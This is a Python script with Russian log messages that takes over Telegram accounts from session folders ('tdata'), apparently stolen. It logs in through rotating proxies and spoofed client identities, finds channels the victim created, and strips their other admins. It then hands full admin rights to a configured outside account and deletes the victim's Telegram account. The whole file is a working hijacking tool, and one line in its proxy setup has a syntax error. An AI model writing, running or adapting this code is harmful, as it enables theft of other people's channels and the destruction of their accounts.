from opentele.td import TDesktop
from loguru import logger
from opentele.api import UseCurrentSession
from telethon.tl.types import ChannelParticipantsAdmins
from telethon.tl.functions.channels import InviteToChannelRequest
from opentele.api import API
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.account import DeleteAccountRequest
from telethon import functions
from telethon.errors import RPCError
import asyncio,re,json,shutil,random,os,python_socks,sys
from random import choice
from telethon import TelegramClient
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

if not os.path.exists('proxies.txt'):
    with open('proxies.txt','w',encoding='utf-8') as file:
        file.write('')

with open('proxies.txt','r',encoding='utf-8') as proxy_file:
    proxies = proxy_file.read().split('\n')

logger.success(f'[+] Загружено {len(proxies)} прокси\n')

with open("config.json","r",encoding="utf-8") as file:
    cfg = json.loads(file.read())


def move_log(path,path_2):
    try:
        shutil.move(path, path_2)
    except:
        try:
            shutil.rmtree(path)
        except:
            pass


async def main():
    
    userName = cfg['to_invite_username']
    userId = cfg['to_invite_id']

    if not os.path.isdir('tdatas'):
        os.mkdir('tdatas')
    if not os.path.isdir('results'):
        os.mkdir('results')
    if not os.path.isdir('NotFoundTdata'):
        os.mkdir('NotFoundTdata')
    for tdata_folder in os.listdir('tdatas'):
        tdataFolder = f'tdatas/{tdata_folder}'
        if os.path.isdir(tdataFolder):
            try:
                tdesk = TDesktop(tdataFolder)
            except:
                logger.error(f'{tdata_folder} - Аккаунт не найден')
                move_log(f'tdatas/{tdata_folder}', f"NotFoundTdata/{tdata_folder}")
                continue
            if tdesk.isLoaded():
                session = f"tdatas/{tdata_folder}/telethon.session"
                if os.path.exists(session):
                    os.remove(session)
                listapi = [API.TelegramAndroid.Generate, API.TelegramDesktop.Generate,
                            API.TelegramAndroidX.Generate,
                            API.TelegramIOS.Generate, API.TelegramMacOS.Generate]
                api = random.choice(listapi)
                try:
                    proxy = choice(proxies)
                    proxy2 = {
                        'proxy_type': python_socks.ProxyType.SOCKS5
                        'addr': proxy.split(":")[0],
                        'port': int(proxy.split(":")[1]),
                        'username': proxy.split(":")[2],
                        'password': proxy.split(":")[3], 
                        'rdns': True
                    }
                    client = await tdesk.ToTelethon(session=session, api=api, flag=UseCurrentSession,
                                                    proxy=proxy2)
                except:
                    client = await tdesk.ToTelethon(session=session, flag=UseCurrentSession)
                try:
                    try:
                        await client.connect()
                    except:
                        pass
                except Exception as er:
                    if 'The authorization key (session file) was used under two different IP' in str(er):
                        logger.info(f'{tdata_folder} - Аккаунт используется')
                    else:
                        logger.info(f"{tdata_folder} — Невалид")
                else:
                    try:
                        await client.PrintSessions()
                    except Exception as er:
                        if str(er) == 'The key is not registered in the system (caused by GetAuthorizationsRequest)':

                            logger.error(f"{tdata_folder} — Требуется релогин")
                        elif str(
                                er) == 'The user has been deleted/deactivated (caused by GetAuthorizationsRequest)':
                            logger.error(f'{tdata_folder} - Аккаунт удалён')
                        elif str(
                                er) == 'The authorization has been invalidated, because of the user terminating all sessions (caused by GetAuthorizationsRequest)':
                            logger.error(f'{tdata_folder} - Все сессии на аккаунте снесены')
                        elif str(er) == 'Cannot send requests while disconnected':
                            logger.info(f"{tdata_folder} — Невалид")
                        elif str(er) == 'The authorization key (session file) was used under two different IP addresses simultaneously, and can no longer be used. Use the same session exclusively, or use different sessions (caused by GetAuthorizationsRequest)':
                            logger.info(f"{tdata_folder} — Нельзя авторизоваться с двух IP")
                        else:
                            logger.error(str(er))

                        await client.disconnect()
                        move_log(f'tdatas/{tdata_folder}', f"NotFoundTdata/{tdata_folder}")
                    else:

                        logger.success(f"{tdata_folder} — Valid")
                        user_info = await client.get_me()
                        await search_chats(client, user_info, f'tdatas/{tdata_folder}', userId, userName)
            else:
                move_log(f'tdatas/{tdata_folder}', f"NotFoundTdata/{tdata_folder}")
                logger.info(f"{tdata_folder} — Не загружен ни один аккаунт")

        else:
            move_log(f'tdatas/{tdata_folder}', f"NotFoundTdata/{tdata_folder}")
            logger.info(f"{tdata_folder} — Не найдена tdata")

async def search_chats(client,user_info,path,userId,userName):
    print()
    r_k = []
    dialogs = client.iter_dialogs()
    async for dialog in dialogs:
        if dialog.is_channel:
            if dialog.entity.megagroup == cfg['dialogs']:
                logger.info(f"[~] Найден канал - {dialog.name}")
                if dialog.entity.creator:
                    username_list = dialog.entity.participants_count
                    txt_to = 'канал' if not dialog.entity.megagroup else 'чат'
                    logger.info(f"[~] Найден {txt_to} - {dialog.name} | Subs: {username_list}")
                    if username_list >= cfg['subs_count']:
                        try:
                            async for user in client.iter_participants(dialog.id, filter=ChannelParticipantsAdmins):
                                if user.id != user_info.id:
                                    await client.edit_admin(dialog.id, user.id, is_admin=False, add_admins=False)
                                    logger.success(f'[+] Успешно сняли админа - {user.id} | C канала: {dialog.name}')
                            try:
                                logger.success(
                                    f"[+] Найден {txt_to}: {dialog.name} | Вступаем по приглашению (@{userName})")
                                await client(InviteToChannelRequest(
                                    channel=dialog.id,
                                    users=['@'+userName]
                                ))
                            except:
                                result = await client(functions.messages.ExportChatInviteRequest(dialog.id))
                                link = result.link

                                logger.success(f"[+] Найден {txt_to}: {dialog.name} | Вступите по ссылке: {link} и бот перевяжет канал")
                                logger.warning('[~] Ссылка уже скопирована!')
                                command = 'echo ' + link + '| clip'
                                os.system(command)
                                input()
                            
                            logger.success(f"[+] Бот успешно вступил в {txt_to} - {dialog.name} | Начинаем перевяз!")
                            await asyncio.sleep(5)
                            r_k.append(dialog.id)


                        except Exception as er:
                            if 'Could not find the input entity for PeerUser' in str(er):
                                logger.error('[-] Вы не вступили в канал!')
                            else:
                                logger.error(str(er))
    if r_k != []:
        logger.info('Выходим из телеграма и подключаемся снова, с ожиданием 5 секунд')
        await client.disconnect()
        await asyncio.sleep(5)
        try:
            await client.connect()
        except:
            await client.start()
        dialogs = client.iter_dialogs()
        async for dialog in dialogs:
            if dialog.id in r_k:
                await client.get_participants(dialog.id)
                while True:
                    try:
                        await client.edit_admin(dialog.id, userId, is_admin=True, add_admins=True)
                        break
                    except Exception as er:
                        logger.error(str(er))
                        logger.error('Спим 15 секунд и перевязываем снова')
                        await asyncio.sleep(15)
                logger.success("[+] Права админа успешно переданы!")
    print()
    if len(r_k) >= 1:
        logger.success(f'[+] Перевязано {len(r_k)} каналов')
        try:
            await client(DeleteAccountRequest(reason=''))
        except asyncio.CancelledError:
            print("Task was cancelled.")
        except RPCError as e:
            print(f"Telegram API error: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

        logger.success(f'[+] Аккаунт удалён | {user_info.first_name} {user_info.last_name}')
    else:
        logger.info(f'[-] Перевязано {len(r_k)} каналов')
    await client.disconnect()
    move_log(path,f'results/{len(r_k)}_channels_{user_info.id}')


if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())